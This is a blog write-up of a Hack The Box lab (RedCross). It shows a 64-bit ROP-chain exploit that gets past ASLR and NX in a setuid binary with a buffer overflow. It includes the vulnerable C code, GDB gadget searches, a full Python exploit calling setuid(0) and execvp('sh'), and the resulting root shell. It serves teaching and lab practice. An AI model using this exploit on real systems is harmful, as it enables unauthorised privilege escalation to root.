---
layout: post
title: Bypass ASLR + NX (64-bit) - ROP Chain
description: Bypass ASLR + NX (64-bit) - ROP Chain
summary: Bypass ASLR + NX (64-bit) - ROP Chain
tags: [bof,privesc]
minute: 1
---
## Overview
If ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.

In this technique, we can find some ROP gadgets whose address are static and we can use them to do `setuid(0)` and drop to a shell using `execvpe()`.

## Environment Setup
* SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though `fgets` is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.

```c
// filename: iptctl
// [...redacted...]
// 360 bytes here
#define BUFFSIZE 360

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        // but destination buffer locally is 10 bytes only!
        // this is the buffer overflow part
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");

        // hence, fgets is not using the correct buffer size
        fgets(inputAction,BUFFSIZE,stdin);

        // this also have vulnerable fgets but we will ignore
        // this part since its hard to send arbritrary input
        // here, inputAddress is being validated properly
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;

        // this is the validation part, isValidIpAddress is
        // validated properly but not isValidAction
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;

// [...redacted...]
```

We will also use GDB peda as our debugger.

## Steps
* Get a copy of binary and put it on your attacker machine
* Determine protections

```bash
# check ASLR on victim machine
penelope@redcross:/dev/shm$ cat /proc/sys/kernel/randomize_va_space
2
penelope@redcross:/dev/shm$

# check PIE on gdb peda on attacker machine
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
```

* Find offset to `RIP`

```bash
# set breakpoints
br *interactive+73
br *interactive+73

# create pattern - 50 is more than enough since we only need
# 10 bytes to overflow
pattern_create 50

# run interactively
gdb-peda$ run -i
Starting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl -i
Entering interactive mode
Action(allow|restrict|show): allowAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
# [...redacted....]

# find offset - get value of "saved rip" first
info frame 
pattern_offset 0x4541412941413b41

# offset is 29
```

* Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do `setuid(0)` first before dropping to shell via `execvp` so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below "Explaining the payload structure".

```python
payload = "allow" + "A"*29 + pop_rdi_addr + null + setuid_addr + pop_rdi_addr + sh_addr + pop_rsi_pop_r15_addr + null + null + execvp_addr + "\n" + "1.1.1.1" + "\n"
```

* Now let's find the values

```bash
# pop_rdi_addr
gdb-peda$ ropsearch "pop rdi"

# null
"\x00\x00\x00\x00\x00\x00\x00\x00"

# setuid_addr
gdb-peda$ plt
# [...redacted...]
Breakpoint 37 at 0x400780 (setuid@plt)
# [...redacted...]
gdb-peda$

# sh_addr
gdb-peda$ find "sh"
# [...redacted...]
    iptctl : 0x40046e --> 0x7063727473006873 ('sh')
# [...redacted...]

# pop_rsi_pop_r15_addr
gdb-peda$ ropsearch "pop rsi"
# [...redacted...]
0x00400de1 : (b'5e415fc3')	pop rsi; pop r15; ret
gdb-peda$ 

# execvp_addr
gdb-peda$ plt
Breakpoint 42 at 0x400760 (execvp@plt)
# [...redacted...]
gdb-peda$ 
```

* Let's construct our final python script. I will not use `pwn` tools to show how this is being done without any helper functions.

```python
#!/usr/bin/env python

# gadgets and variables - take note that due to being little
# endian, we need to consutrct the memory addresses in reverse
# order. For example, if we see an addres in gdb which is
# "0x400760" in python it will be "\x60\x07\x40".
# 
# Another thing to take note of is that since we are dealing
# with 64-bit architecture, you might often see in debuggers
# that they only display 6 bytes of address instead of 8.
# That's because the remaining 2 bytes are not used. So in our
# python script, just replace the missing 2 bytes with NULL
# bytes "\x00\x00".                                                           
pop_rdi_addr = "\xe3\x0d\x40\x00\x00\x00\x00\x00"                                                                                                   
sh_addr = "\x6e\04\x40\x00\x00\x00\x00\x00"                                                                                               
pop_rsi_pop_r15_addr = "\xe1\x0d\x40\x00\x00\x00\x00\x00"                                                                                            
execvp_addr = "\x60\x07\x40\x00\x00\x00\x00\x00"                                                                                                   
setuid_addr = "\x80\x07\x40\x00\x00\x00\x00\x00"                                
null = "\x00\x00\x00\x00\x00\x00\x00\x00"
                                                                                
payload = "allow" + "A"*29
payload += pop_rdi_addr + null + setuid_addr
payload += pop_rdi_addr + sh_addr + pop_rsi_pop_r15_addr + null + null + execvp_addr + "\n"
payload += "1.1.1.1" + "\n"

print(payload)
```

* Copy this script any run on victim machine

```bash
penelope@redcross:/dev/shm$ (python2 bof.py;cat -) | /opt/iptctl/iptctl -i
Entering interactive mode
id
uid=0(root) gid=1000(penelope) egid=0(root) groups=0(root),4(adm),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner),1000(penelope),1003(mailadm)
```

## Explaining the payload structure
First things to understand is how the calling conventions work for 32-bit and 64-bit architectures.

```bash
execvp()
NULL
NULL
pop rsi; pop r15; ret
"sh"
pop rdi; ret
setuid()
NULL
pop rdi; ret
"allow" + "A"*29
```

To better understand, let's divide the payload into different stack frames.

```bash
# stack frame 2
execvp()
NULL
NULL
pop rsi; pop r15; ret
"sh"
pop rdi; ret

# stack frame 1
setuid()
NULL
pop rdi; ret
"allow" + "A"*29
```

Let's take a closer look at stack frame 1.

```bash
## higher memory address ##

# Once the "pop rdi" instruction is finished executing, the
# next instructions is "ret". Since "setuid()" address is the
# next value from stack, the flow of execution will now go
# there completing our command `setuid(0)`.
setuid()

# When the "pop rdi" instruction executes, it will pop
# the next value from the stack into RDI. That next value is
# NULL which is also equal to "0".
NULL

# This contains the address of "pop rdi; ret". Why do need it?
# In 64-bit calling convention, to pass a parameter to a
# function, in this case `setuid()`, we need to put the
# parameter into RDI. Then once its there, the function will
# get it in the form of `setuid(0)`.
pop rdi; ret

# This is the overflow part which will allow us to control the
# next instruction to execute which is on RIP. The next
# instruction will be on top of this.
"allow" + "A"*29

## lower memory address ##
```

Then for stack frame 2.

```bash
## higher memory address ##

# When "ret" executes, it will go to address of instruction
# `execvp()` completing our final function call which is
# `execvp("sh", NULL)`
execvp()

# When "pop r15" executes, it will put NULL into RSI
NULL

# When "pop rsi" executes, it will put NULL into RSI
NULL

# When "ret" instruction executes, it will go to this
# instruction. Why do we need "pop r15"? Actually we don't
# need it. It just happened that there is no gadget which
# consists only of "pop rsi". So for completenes, we have no
# choice but to include also "pop r15" in our ROP chain.
pop rsi; pop r15; ret

# When "pop rdi" instruction executes, it will put "sh" into
# RDI since this is the next value in the stack.
"sh"

# Continuing from previous stack frame, the next instruction
# to execute is "pop rdi; ret". In this case our target
# function call is `execvp()`. It accepts 2 parameters:
#  1. the string we want to execute in this case its
#     `/bin/sh` or just "sh". This should be put to RDI.
#  2. a NULL terminator and must be put to RSI.
pop rdi; ret

## lower memory address ##
```

Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.

```bash
## stack view @ RIP "pop_rdi_addr"
setuid_addr
null
pop_rdi_addr    # --> flow executions continues @ this addr

## stack view @ pop rdi
setuid_addr
null            # --> POP to RDI

## stack view @ ret
setuid_addr     # --> executes `setuid(0)`
```

## References
* HTB RedCross
